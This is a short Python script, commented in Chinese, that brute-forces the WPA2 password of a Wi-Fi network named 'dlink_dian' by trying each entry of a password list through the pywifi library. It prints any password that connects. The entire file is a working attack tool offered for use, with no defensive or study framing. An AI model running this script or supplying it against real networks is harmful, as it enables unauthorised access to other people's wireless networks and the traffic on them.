# -*- coding:utf-8 -*-

import pywifi
import sys
import time
from pywifi import const

wifi = pywifi.PyWiFi()  # 创建一个无线对象
iface = wifi.interfaces()[0]  # 取第一个无限网卡

def test_conn(ssid, pwd):
    # iface.remove_all_network_profiles()
    iface.disconnect()
    time.sleep(1)
    # 新建配置文件
    profile = pywifi.Profile()
    # 设置网络名称
    profile.ssid = ssid
    # 打开连接
    profile.auth = const.AUTH_ALG_OPEN
    # 设置加密方式，是列表类型
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    # 设置加密单元
    profile.cipher = const.CIPHER_TYPE_CCMP
    # 设置密码
    profile.key = pwd

    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(1)
    return iface.status() == const.IFACE_CONNECTED

if __name__=="__main__":
    with open('pwds.txt') as f:
        pwd_list = [i.strip() for i in f.readlines()]
    
    for p in pwd_list:
        if test_conn('dlink_dian', p):
            print(p)